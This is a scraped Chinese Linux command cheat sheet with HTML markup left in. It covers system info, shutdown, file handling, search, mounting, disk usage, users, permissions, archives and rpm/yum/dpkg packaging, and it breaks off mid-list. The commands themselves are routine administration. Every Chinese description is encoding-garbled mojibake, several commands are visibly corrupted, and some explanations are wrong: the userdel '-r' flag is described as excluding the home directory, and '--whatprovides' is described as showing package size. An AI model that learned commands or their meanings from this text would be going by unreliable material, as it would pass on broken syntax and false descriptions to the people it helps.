/proc/net/dev æ˜¾ç¤ºç½‘ç»œé€‚é…å™¨åŠç»Ÿè®¡ <span class="token function">cat</span> /proc/mounts æ˜¾ç¤ºå·²åŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿ lspci -tv ç½—åˆ— PCI è®¾å¤‡ lsusb -tv æ˜¾ç¤º USB è®¾å¤‡ <span class="token function">date</span> æ˜¾ç¤ºç³»ç»Ÿæ—¥æœŸ <span class="token function">cal</span> 2007 æ˜¾ç¤º2007å¹´çš„æ—¥å†è¡¨ <span class="token function">date</span> 041217002007.00 è®¾ç½®æ—¥æœŸå’Œæ—¶é—´ - æœˆæ—¥æ—¶åˆ†å¹´.ç§’ clock -w å°†æ—¶é—´ä¿®æ”¹ä¿å­˜åˆ° BIOSå…³æœº <span class="token punctuation">(</span>ç³»ç»Ÿçš„å…³æœºã€é‡å¯ä»¥åŠç™»å‡º <span class="token punctuation">)</span> <span class="token function">shutdown</span> -h now å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>1<span class="token punctuation">)</span> init 0 å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>2<span class="token punctuation">)</span> telinit 0 å…³é—­ç³»ç»Ÿ<span class="token punctuation">(</span>3<span class="token punctuation">)</span> <span class="token function">shutdown</span> -h hours:minutes <span class="token operator">&amp;</span> æŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿ <span class="token function">shutdown</span> -c å–æ¶ˆæŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿ <span class="token function">shutdown</span> -r now é‡å¯<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token function">reboot</span> é‡å¯<span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">logout</span> æ³¨é”€</code></pre><h2 id="æ–‡ä»¶å’Œç›®å½•"><a href="#æ–‡ä»¶å’Œç›®å½•" class="headerlink" title="æ–‡ä»¶å’Œç›®å½•"></a>æ–‡ä»¶å’Œç›®å½•</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /home è¿›å…¥ <span class="token string">'/ home'</span> ç›®å½•<span class="token string">' cd .. è¿”å›ä¸Šä¸€çº§ç›®å½• cd ../.. è¿”å›ä¸Šä¸¤çº§ç›®å½• cd è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½• cd ~user1 è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½• cd - è¿”å›ä¸Šæ¬¡æ‰€åœ¨çš„ç›®å½• pwd æ˜¾ç¤ºå·¥ä½œè·¯å¾„ ls æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶ ls -F æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶ ls -l æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„è¯¦ç»†èµ„æ–™ ls -a æ˜¾ç¤ºéšè—æ–‡ä»¶ ls *[0-9]* æ˜¾ç¤ºåŒ…å«æ•°å­—çš„æ–‡ä»¶åå’Œç›®å½•å tree æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„(1) lstree æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„(2) mkdir dir1 åˆ›å»ºä¸€ä¸ªå«åš '</span>dir1<span class="token string">' çš„ç›®å½•'</span> <span class="token function">mkdir</span> dir1 dir2 åŒæ—¶åˆ›å»ºä¸¤ä¸ªç›®å½• <span class="token function">mkdir</span> -p /tmp/dir1/dir2 åˆ›å»ºä¸€ä¸ªç›®å½•æ ‘ <span class="token function">rm</span> -f file1 åˆ é™¤ä¸€ä¸ªå«åš <span class="token string">'file1'</span> çš„æ–‡ä»¶<span class="token string">' rmdir dir1 åˆ é™¤ä¸€ä¸ªå«åš '</span>dir1<span class="token string">' çš„ç›®å½•'</span> <span class="token function">rm</span> -rf dir1 åˆ é™¤ä¸€ä¸ªå«åš <span class="token string">'dir1'</span> çš„ç›®å½•å¹¶åŒæ—¶åˆ é™¤å…¶å†…å®¹ <span class="token function">rm</span> -rf dir1 dir2 åŒæ—¶åˆ é™¤ä¸¤ä¸ªç›®å½•åŠå®ƒä»¬çš„å†…å®¹ <span class="token function">mv</span> dir1 new_dir é‡å‘½å/ç§»åŠ¨ ä¸€ä¸ªç›®å½• <span class="token function">cp</span> file1 file2 å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶ <span class="token function">cp</span> dir/* <span class="token keyword">.</span> å¤åˆ¶ä¸€ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åˆ°å½“å‰å·¥ä½œç›®å½• <span class="token function">cp</span> -a /tmp/dir1 <span class="token keyword">.</span> å¤åˆ¶ä¸€ä¸ªç›®å½•åˆ°å½“å‰å·¥ä½œç›®å½• <span class="token function">cp</span> -a dir1 dir2 å¤åˆ¶ä¸€ä¸ªç›®å½• <span class="token function">ln</span> -s file1 lnk1 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„è½¯é“¾æ¥ <span class="token function">ln</span> file1 lnk1 åˆ›å»ºä¸€ä¸ªæŒ‡å‘æ–‡ä»¶æˆ–ç›®å½•çš„ç‰©ç†é“¾æ¥ <span class="token function">touch</span> -t 0712250000 file1 ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„æ—¶é—´æˆ³ - <span class="token punctuation">(</span>YYMMDDhhmm<span class="token punctuation">)</span> <span class="token function">file</span> file1 outputs the mime <span class="token function">type</span> of the <span class="token function">file</span> as text <span class="token function">iconv</span> -l åˆ—å‡ºå·²çŸ¥çš„ç¼–ç  <span class="token function">iconv</span> -f fromEncoding -t toEncoding inputFile <span class="token operator">></span> outputFile creates a new from the given input <span class="token function">file</span> by assuming it is encoded <span class="token keyword">in</span> fromEncoding and converting it to toEncoding. <span class="token function">find</span> <span class="token keyword">.</span> -maxdepth 1 -name *.jpg -print -exec convert <span class="token string">"{}"</span> -resize 80x60 <span class="token string">"thumbs/{}"</span> \<span class="token punctuation">;</span> batch resize files <span class="token keyword">in</span> the current directory and send them to a thumbnails directory <span class="token punctuation">(</span>requires convert from Imagemagick<span class="token punctuation">)</span></code></pre><h2 id="æ–‡ä»¶æœç´¢"><a href="#æ–‡ä»¶æœç´¢" class="headerlink" title="æ–‡ä»¶æœç´¢"></a>æ–‡ä»¶æœç´¢</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -name file1 ä» <span class="token string">'/'</span> å¼€å§‹è¿›å…¥æ ¹æ–‡ä»¶ç³»ç»Ÿæœç´¢æ–‡ä»¶å’Œç›®å½• <span class="token function">find</span> / -user user1 æœç´¢å±äºç”¨æˆ· <span class="token string">'user1'</span> çš„æ–‡ä»¶å’Œç›®å½• <span class="token function">find</span> /home/user1 -name \*.bin åœ¨ç›®å½• <span class="token string">'/ home/user1'</span> ä¸­æœç´¢å¸¦æœ‰<span class="token string">'.bin'</span> ç»“å°¾çš„æ–‡ä»¶ <span class="token function">find</span> /usr/bin -type f -atime +100 æœç´¢åœ¨è¿‡å»100å¤©å†…æœªè¢«ä½¿ç”¨è¿‡çš„æ‰§è¡Œæ–‡ä»¶ <span class="token function">find</span> /usr/bin -type f -mtime -10 æœç´¢åœ¨10å¤©å†…è¢«åˆ›å»ºæˆ–è€…ä¿®æ”¹è¿‡çš„æ–‡ä»¶ <span class="token function">find</span> / -name \*.rpm -exec <span class="token function">chmod</span> 755 <span class="token string">'{}'</span> \<span class="token punctuation">;</span> æœç´¢ä»¥ <span class="token string">'.rpm'</span> ç»“å°¾çš„æ–‡ä»¶å¹¶å®šä¹‰å…¶æƒé™ <span class="token function">find</span> / -xdev -name \*.rpm æœç´¢ä»¥ <span class="token string">'.rpm'</span> ç»“å°¾çš„æ–‡ä»¶ï¼Œå¿½ç•¥å…‰é©±ã€æ·ç›˜ç­‰å¯ç§»åŠ¨è®¾å¤‡ <span class="token function">locate</span> \*.ps å¯»æ‰¾ä»¥ <span class="token string">'.ps'</span> ç»“å°¾çš„æ–‡ä»¶ - å…ˆè¿è¡Œ <span class="token string">'updatedb'</span> å‘½ä»¤ <span class="token function">whereis</span> halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€æºç æˆ–mançš„ä½ç½® <span class="token function">which</span> halt æ˜¾ç¤ºä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„</code></pre><h2 id="æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"><a href="#æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ"></a>æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">mount</span> /dev/hda2 /mnt/hda2 æŒ‚è½½ä¸€ä¸ªå«åšhda2çš„ç›˜ - ç¡®å®šç›®å½• <span class="token string">'/ mnt/hda2'</span> å·²ç»å­˜åœ¨ <span class="token function">umount</span> /dev/hda2 å¸è½½ä¸€ä¸ªå«åšhda2çš„ç›˜ - å…ˆä»æŒ‚è½½ç‚¹ <span class="token string">'/ mnt/hda2'</span> é€€å‡º <span class="token function">fuser</span> -km /mnt/hda2 å½“è®¾å¤‡ç¹å¿™æ—¶å¼ºåˆ¶å¸è½½ <span class="token function">umount</span> -n /mnt/hda2 è¿è¡Œå¸è½½æ“ä½œè€Œä¸å†™å…¥ /etc/mtab æ–‡ä»¶- å½“æ–‡ä»¶ä¸ºåªè¯»æˆ–å½“ç£ç›˜å†™æ»¡æ—¶éå¸¸æœ‰ç”¨ <span class="token function">mount</span> /dev/fd0 /mnt/floppy æŒ‚è½½ä¸€ä¸ªè½¯ç›˜ <span class="token function">mount</span> /dev/cdrom /mnt/cdrom æŒ‚è½½ä¸€ä¸ªcdromæˆ–dvdrom <span class="token function">mount</span> /dev/hdc /mnt/cdrecorder æŒ‚è½½ä¸€ä¸ªcdrwæˆ–dvdrom <span class="token function">mount</span> /dev/hdb /mnt/cdrecorder æŒ‚è½½ä¸€ä¸ªcdrwæˆ–dvdrom <span class="token function">mount</span> -o loop file.iso /mnt/cdrom æŒ‚è½½ä¸€ä¸ªæ–‡ä»¶æˆ–ISOé•œåƒæ–‡ä»¶ <span class="token function">mount</span> -t vfat /dev/hda5 /mnt/hda5 æŒ‚è½½ä¸€ä¸ªWindows FAT32æ–‡ä»¶ç³»ç»Ÿ <span class="token function">mount</span> /dev/sda1 /mnt/usbdisk æŒ‚è½½ä¸€ä¸ªusb æ·ç›˜æˆ–é—ªå­˜è®¾å¤‡ <span class="token function">mount</span> -t smbfs -o username<span class="token operator">=</span>user,password<span class="token operator">=</span>pass //WinClient/share /mnt/share æŒ‚è½½ä¸€ä¸ªwindowsç½‘ç»œå…±äº«</code></pre><h2 id="ç£ç›˜ç©ºé—´"><a href="#ç£ç›˜ç©ºé—´" class="headerlink" title="ç£ç›˜ç©ºé—´"></a>ç£ç›˜ç©ºé—´</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">df</span> -h æ˜¾ç¤ºå·²ç»æŒ‚è½½çš„åˆ†åŒºåˆ—è¡¨ <span class="token function">ls</span> -lSr <span class="token operator">|</span><span class="token function">more</span> ä»¥å°ºå¯¸å¤§å°æ’åˆ—æ–‡ä»¶å’Œç›®å½• <span class="token function">du</span> -sh dir1 ä¼°ç®—ç›®å½• <span class="token string">'dir1'</span> å·²ç»ä½¿ç”¨çš„ç£ç›˜ç©ºé—´<span class="token string">' du -sk * | sort -rn ä»¥å®¹é‡å¤§å°ä¸ºä¾æ®ä¾æ¬¡æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„å¤§å° rpm -q -a --qf '</span>%10<span class="token punctuation">{</span>SIZE<span class="token punctuation">}</span>t%<span class="token punctuation">{</span>NAME<span class="token punctuation">}</span>n<span class="token string">' | sort -k1,1n ä»¥å¤§å°ä¸ºä¾æ®ä¾æ¬¡æ˜¾ç¤ºå·²å®‰è£…çš„rpmåŒ…æ‰€ä½¿ç”¨çš„ç©ºé—´ (fedora, redhatç±»ç³»ç»Ÿ) dpkg-query -W -f='</span>Installedâˆ’Size<span class="token punctuation">;</span>10tInstalledâˆ’Size<span class="token punctuation">;</span>10t<span class="token punctuation">{</span>Package<span class="token punctuation">}</span>n' <span class="token operator">|</span> <span class="token function">sort</span> -k1,1n ä»¥å¤§å°ä¸ºä¾æ®æ˜¾ç¤ºå·²å®‰è£…çš„debåŒ…æ‰€ä½¿ç”¨çš„ç©ºé—´ <span class="token punctuation">(</span>ubuntu, debianç±»ç³»ç»Ÿ<span class="token punctuation">)</span></code></pre><h2 id="ç”¨æˆ·å’Œç¾¤ç»„"><a href="#ç”¨æˆ·å’Œç¾¤ç»„" class="headerlink" title="ç”¨æˆ·å’Œç¾¤ç»„"></a>ç”¨æˆ·å’Œç¾¤ç»„</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">groupadd</span> group_name åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ç»„ <span class="token function">groupdel</span> group_name åˆ é™¤ä¸€ä¸ªç”¨æˆ·ç»„ <span class="token function">groupmod</span> -n new_group_name old_group_name é‡å‘½åä¸€ä¸ªç”¨æˆ·ç»„ <span class="token function">useradd</span> -c <span class="token string">"Name Surname "</span> -g admin -d /home/user1 -s /bin/bash user1 åˆ›å»ºä¸€ä¸ªå±äº <span class="token string">"admin"</span> ç”¨æˆ·ç»„çš„ç”¨æˆ· <span class="token function">useradd</span> user1 åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ· <span class="token function">userdel</span> -r user1 åˆ é™¤ä¸€ä¸ªç”¨æˆ· <span class="token punctuation">(</span> <span class="token string">'-r'</span> æ’é™¤ä¸»ç›®å½•<span class="token punctuation">)</span> <span class="token function">usermod</span> -c <span class="token string">"User FTP"</span> -g system -d /ftp/user1 -s /bin/nologin user1 ä¿®æ”¹ç”¨æˆ·å±æ€§ <span class="token function">passwd</span> ä¿®æ”¹å£ä»¤ <span class="token function">passwd</span> user1 ä¿®æ”¹ä¸€ä¸ªç”¨æˆ·çš„å£ä»¤ <span class="token punctuation">(</span>åªå…è®¸rootæ‰§è¡Œ<span class="token punctuation">)</span> chage -E 2005-12-31 user1 è®¾ç½®ç”¨æˆ·å£ä»¤çš„å¤±æ•ˆæœŸé™ pwck æ£€æŸ¥ <span class="token string">'/etc/passwd'</span> çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç”¨æˆ· grpck æ£€æŸ¥ <span class="token string">'/etc/passwd'</span> çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç¾¤ç»„ newgrp group_name ç™»é™†è¿›ä¸€ä¸ªæ–°çš„ç¾¤ç»„ä»¥æ”¹å˜æ–°åˆ›å»ºæ–‡ä»¶çš„é¢„è®¾ç¾¤ç»„</code></pre><h2 id="æ–‡ä»¶çš„æƒé™"><a href="#æ–‡ä»¶çš„æƒé™" class="headerlink" title="æ–‡ä»¶çš„æƒé™"></a>æ–‡ä»¶çš„æƒé™</h2><pre class=" language-bash"><code class="language-bash">-â€”â€”ä½¿ç”¨ <span class="token string">"+"</span> è®¾ç½®æƒé™ï¼Œä½¿ç”¨ <span class="token string">"-"</span> ç”¨äºå–æ¶ˆ <span class="token function">ls</span> -lh æ˜¾ç¤ºæƒé™ <span class="token function">ls</span> /tmp <span class="token operator">|</span> <span class="token function">pr</span> -T5 -W<span class="token variable">$COLUMNS</span> å°†ç»ˆç«¯åˆ’åˆ†æˆ5æ æ˜¾ç¤º <span class="token function">chmod</span> ugo+rwx directory1 è®¾ç½®ç›®å½•çš„æ‰€æœ‰äºº<span class="token punctuation">(</span>u<span class="token punctuation">)</span>ã€ç¾¤ç»„<span class="token punctuation">(</span>g<span class="token punctuation">)</span>ä»¥åŠå…¶ä»–äºº<span class="token punctuation">(</span>o<span class="token punctuation">)</span>ä»¥è¯»ï¼ˆr ï¼‰ã€å†™<span class="token punctuation">(</span>w<span class="token punctuation">)</span>å’Œæ‰§è¡Œ<span class="token punctuation">(</span>x<span class="token punctuation">)</span>çš„æƒé™ <span class="token function">chmod</span> go-rwx directory1 åˆ é™¤ç¾¤ç»„<span class="token punctuation">(</span>g<span class="token punctuation">)</span>ä¸å…¶ä»–äºº<span class="token punctuation">(</span>o<span class="token punctuation">)</span>å¯¹ç›®å½•çš„è¯»å†™æ‰§è¡Œæƒé™ <span class="token function">chown</span> user1 file1 æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰äººå±æ€§ <span class="token function">chown</span> -R user1 directory1 æ”¹å˜ä¸€ä¸ªç›®å½•çš„æ‰€æœ‰äººå±æ€§å¹¶åŒæ—¶æ”¹å˜æ”¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å±æ€§ <span class="token function">chgrp</span> group1 file1 æ”¹å˜æ–‡ä»¶çš„ç¾¤ç»„ <span class="token function">chown</span> user1:group1 file1 æ”¹å˜ä¸€ä¸ªæ–‡ä»¶çš„æ‰€æœ‰äººå’Œç¾¤ç»„å±æ€§ <span class="token function">find</span> / -perm -u+s ç½—åˆ—ä¸€ä¸ªç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨äº†SUIDæ§åˆ¶çš„æ–‡ä»¶ <span class="token function">chmod</span> u+s /bin/file1 è®¾ç½®ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUID ä½ - è¿è¡Œè¯¥æ–‡ä»¶çš„ç”¨æˆ·ä¹Ÿè¢«èµ‹äºˆå’Œæ‰€æœ‰è€…åŒæ ·çš„æƒé™ <span class="token function">chmod</span> u-s /bin/file1 ç¦ç”¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUIDä½ <span class="token function">chmod</span> g+s /home/public è®¾ç½®ä¸€ä¸ªç›®å½•çš„SGID ä½ - ç±»ä¼¼SUID ï¼Œä¸è¿‡è¿™æ˜¯é’ˆå¯¹ç›®å½•çš„ <span class="token function">chmod</span> g-s /home/public ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ SGID ä½ <span class="token function">chmod</span> o+t /home/public è®¾ç½®ä¸€ä¸ªæ–‡ä»¶çš„ STIKY ä½ - åªå…è®¸åˆæ³•æ‰€æœ‰äººåˆ é™¤æ–‡ä»¶ <span class="token function">chmod</span> o-t /home/public ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ STIKY ä½</code></pre><h2 id="æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§"><a href="#æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§" class="headerlink" title="æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§"></a>æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§</h2><pre class=" language-bash"><code class="language-bash">â€”â€” ä½¿ç”¨ <span class="token string">"+"</span> è®¾ç½®æƒé™ï¼Œä½¿ç”¨ <span class="token string">"-"</span> ç”¨äºå–æ¶ˆ chattr +a file1 åªå…è®¸ä»¥è¿½åŠ æ–¹å¼è¯»å†™æ–‡ä»¶ chattr +c file1 å…è®¸è¿™ä¸ªæ–‡ä»¶èƒ½è¢«å†…æ ¸è‡ªåŠ¨å‹ç¼©/è§£å‹ chattr +d file1 åœ¨è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿå¤‡ä»½æ—¶ï¼Œdumpç¨‹åºå°†å¿½ç•¥è¿™ä¸ªæ–‡ä»¶ chattr +i file1 è®¾ç½®æˆä¸å¯å˜çš„æ–‡ä»¶ï¼Œä¸èƒ½è¢«åˆ é™¤ã€ä¿®æ”¹ã€é‡å‘½åæˆ–è€…é“¾æ¥ chattr +s file1 å…è®¸ä¸€ä¸ªæ–‡ä»¶è¢«å®‰å…¨åœ°åˆ é™¤ chattr +S file1 ä¸€æ—¦åº”ç”¨ç¨‹åºå¯¹è¿™ä¸ªæ–‡ä»¶æ‰§è¡Œäº†å†™æ“ä½œï¼Œä½¿ç³»ç»Ÿç«‹åˆ»æŠŠä¿®æ”¹çš„ç»“æœå†™åˆ°ç£ç›˜ chattr +u file1 è‹¥æ–‡ä»¶è¢«åˆ é™¤ï¼Œç³»ç»Ÿä¼šå…è®¸ä½ åœ¨ä»¥åæ¢å¤è¿™ä¸ªè¢«åˆ é™¤çš„æ–‡ä»¶ lsattr æ˜¾ç¤ºç‰¹æ®Šçš„å±æ€§</code></pre><h2 id="æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶"><a href="#æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶" class="headerlink" title="æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶"></a>æ‰“åŒ…å’Œå‹ç¼©æ–‡ä»¶</h2><pre class=" language-bash"><code class="language-bash">bunzip2 file1.bz2 è§£å‹ä¸€ä¸ªå«åš <span class="token string">'file1.bz2'</span>çš„æ–‡ä»¶ <span class="token function">bzip2</span> file1 å‹ç¼©ä¸€ä¸ªå«åš <span class="token string">'file1'</span> çš„æ–‡ä»¶ gunzip file1.gz è§£å‹ä¸€ä¸ªå«åš <span class="token string">'file1.gz'</span>çš„æ–‡ä»¶ <span class="token function">gzip</span> file1 å‹ç¼©ä¸€ä¸ªå«åš <span class="token string">'file1'</span>çš„æ–‡ä»¶ <span class="token function">gzip</span> -9 file1 æœ€å¤§ç¨‹åº¦å‹ç¼© <span class="token function">rar</span> a file1.rar test_file åˆ›å»ºä¸€ä¸ªå«åš <span class="token string">'file1.rar'</span> çš„åŒ… <span class="token function">rar</span> a file1.rar file1 file2 dir1 åŒæ—¶å‹ç¼© <span class="token string">'file1'</span>, <span class="token string">'file2'</span> ä»¥åŠç›®å½• <span class="token string">'dir1'</span> <span class="token function">rar</span> x file1.rar è§£å‹raråŒ… <span class="token function">unrar</span> x file1.rar è§£å‹raråŒ… <span class="token function">tar</span> -cvf archive.tar file1 åˆ›å»ºä¸€ä¸ªéå‹ç¼©çš„ tarball <span class="token function">tar</span> -cvf archive.tar file1 file2 dir1 åˆ›å»ºä¸€ä¸ªåŒ…å«äº† <span class="token string">'file1'</span>, <span class="token string">'file2'</span> ä»¥åŠ <span class="token string">'dir1'</span>çš„æ¡£æ¡ˆæ–‡ä»¶ <span class="token function">tar</span> -tf archive.tar æ˜¾ç¤ºä¸€ä¸ªåŒ…ä¸­çš„å†…å®¹ <span class="token function">tar</span> -xvf archive.tar é‡Šæ”¾ä¸€ä¸ªåŒ… <span class="token function">tar</span> -xvf archive.tar -C /tmp å°†å‹ç¼©åŒ…é‡Šæ”¾åˆ° /tmpç›®å½•ä¸‹ <span class="token function">tar</span> -cvfj archive.tar.bz2 dir1 åˆ›å»ºä¸€ä¸ªbzip2æ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -xvfj archive.tar.bz2 è§£å‹ä¸€ä¸ªbzip2æ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -cvfz archive.tar.gz dir1 åˆ›å»ºä¸€ä¸ªgzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">tar</span> -xvfz archive.tar.gz è§£å‹ä¸€ä¸ªgzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">zip</span> file1.zip file1 åˆ›å»ºä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©åŒ… <span class="token function">zip</span> -r file1.zip file1 file2 dir1 å°†å‡ ä¸ªæ–‡ä»¶å’Œç›®å½•åŒæ—¶å‹ç¼©æˆä¸€ä¸ªzipæ ¼å¼çš„å‹ç¼©åŒ… unzip file1.zip è§£å‹ä¸€ä¸ªzipæ ¼å¼å‹ç¼©åŒ…RPM åŒ… - ï¼ˆFedora, RedhatåŠç±»ä¼¼ç³»ç»Ÿï¼‰ rpm -ivh package.rpm å®‰è£…ä¸€ä¸ªrpmåŒ… rpm -ivh --nodeeps package.rpm å®‰è£…ä¸€ä¸ªrpmåŒ…è€Œå¿½ç•¥ä¾èµ–å…³ç³»è­¦å‘Š rpm -U package.rpm æ›´æ–°ä¸€ä¸ªrpmåŒ…ä½†ä¸æ”¹å˜å…¶é…ç½®æ–‡ä»¶ rpm -F package.rpm æ›´æ–°ä¸€ä¸ªç¡®å®šå·²ç»å®‰è£…çš„rpmåŒ… rpm -e package_name.rpm åˆ é™¤ä¸€ä¸ªrpmåŒ… rpm -qa æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»å®‰è£…çš„rpmåŒ… rpm -qa <span class="token operator">|</span> <span class="token function">grep</span> httpd æ˜¾ç¤ºæ‰€æœ‰åç§°ä¸­åŒ…å« <span class="token string">"httpd"</span> å­—æ ·çš„rpmåŒ… rpm -qi package_name è·å–ä¸€ä¸ªå·²å®‰è£…åŒ…çš„ç‰¹æ®Šä¿¡æ¯ rpm -qg <span class="token string">"System Environment/Daemons"</span> æ˜¾ç¤ºä¸€ä¸ªç»„ä»¶çš„rpmåŒ… rpm -ql package_name æ˜¾ç¤ºä¸€ä¸ªå·²ç»å®‰è£…çš„rpmåŒ…æä¾›çš„æ–‡ä»¶åˆ—è¡¨ rpm -qc package_name æ˜¾ç¤ºä¸€ä¸ªå·²ç»å®‰è£…çš„rpmåŒ…æä¾›çš„é…ç½®æ–‡ä»¶åˆ—è¡¨ rpm -q package_name --whatrequires æ˜¾ç¤ºä¸ä¸€ä¸ªrpmåŒ…å­˜åœ¨ä¾èµ–å…³ç³»çš„åˆ—è¡¨ rpm -q package_name --whatprovides æ˜¾ç¤ºä¸€ä¸ªrpmåŒ…æ‰€å çš„ä½“ç§¯ rpm -q package_name --**s æ˜¾ç¤ºåœ¨å®‰è£…/åˆ é™¤æœŸé—´æ‰€æ‰§è¡Œçš„è„šæœ¬l rpm -q package_name --changelog æ˜¾ç¤ºä¸€ä¸ªrpmåŒ…çš„ä¿®æ”¹å†å² rpm -qf /etc/httpd/conf/httpd.conf ç¡®è®¤æ‰€ç»™çš„æ–‡ä»¶ç”±å“ªä¸ªrpmåŒ…æ‰€æä¾› rpm -qp package.rpm -l æ˜¾ç¤ºç”±ä¸€ä¸ªå°šæœªå®‰è£…çš„rpmåŒ…æä¾›çš„æ–‡ä»¶åˆ—è¡¨ rpm --import /media/cdrom/RPM-GPG-KEY å¯¼å…¥å…¬é’¥æ•°å­—è¯ä¹¦ rpm --checksig package.rpm ç¡®è®¤ä¸€ä¸ªrpmåŒ…çš„å®Œæ•´æ€§ rpm -qa gpg-pubkey ç¡®è®¤å·²å®‰è£…çš„æ‰€æœ‰rpmåŒ…çš„å®Œæ•´æ€§ rpm -V package_name æ£€æŸ¥æ–‡ä»¶å°ºå¯¸ã€ è®¸å¯ã€ç±»å‹ã€æ‰€æœ‰è€…ã€ç¾¤ç»„ã€MD5æ£€æŸ¥ä»¥åŠæœ€åä¿®æ”¹æ—¶é—´ rpm -Va æ£€æŸ¥ç³»ç»Ÿä¸­æ‰€æœ‰å·²å®‰è£…çš„rpmåŒ…- å°å¿ƒä½¿ç”¨ rpm -Vp package.rpm ç¡®è®¤ä¸€ä¸ªrpmåŒ…è¿˜æœªå®‰è£… rpm2cpio package.rpm <span class="token operator">|</span> cpio --extract --make-directories *bin* ä»ä¸€ä¸ªrpmåŒ…è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ rpm -ivh /usr/src/redhat/RPMS/<span class="token variable"><span class="token variable">`</span>arch<span class="token variable">`</span></span>/package.rpm ä»ä¸€ä¸ªrpmæºç å®‰è£…ä¸€ä¸ªæ„å»ºå¥½çš„åŒ… rpmbuild --rebuild package_name.src.rpm ä»ä¸€ä¸ªrpmæºç æ„å»ºä¸€ä¸ª rpm åŒ…YUM è½¯ä»¶åŒ…å‡çº§å™¨ - ï¼ˆFedora, RedHatåŠç±»ä¼¼ç³»ç»Ÿï¼‰ yum <span class="token function">install</span> package_name ä¸‹è½½å¹¶å®‰è£…ä¸€ä¸ªrpmåŒ… yum localinstall package_name.rpm å°†å®‰è£…ä¸€ä¸ªrpmåŒ…ï¼Œä½¿ç”¨ä½ è‡ªå·±çš„è½¯ä»¶ä»“åº“ä¸ºä½ è§£å†³æ‰€æœ‰ä¾èµ–å…³ç³» yum update package_name.rpm æ›´æ–°å½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å®‰è£…çš„rpmåŒ… yum update package_name æ›´æ–°ä¸€ä¸ªrpmåŒ… yum remove package_name åˆ é™¤ä¸€ä¸ªrpmåŒ… yum list åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­å®‰è£…çš„æ‰€æœ‰åŒ… yum search package_name åœ¨rpmä»“åº“ä¸­æœå¯»è½¯ä»¶åŒ… yum clean packages æ¸…ç†rpmç¼“å­˜åˆ é™¤ä¸‹è½½çš„åŒ… yum clean headers åˆ é™¤æ‰€æœ‰å¤´æ–‡ä»¶ yum clean all åˆ é™¤æ‰€æœ‰ç¼“å­˜çš„åŒ…å’Œå¤´æ–‡ä»¶DEB åŒ… <span class="token punctuation">(</span>Debian, Ubuntu ä»¥åŠç±»ä¼¼ç³»ç»Ÿ<span class="token punctuation">)</span> dpkg -i package.deb å®‰è£…/æ›´æ–°ä¸€ä¸ª deb åŒ… dpkg -r package_name ä»ç³»ç»Ÿåˆ é™¤ä¸€ä¸ª deb åŒ… dpkg -l 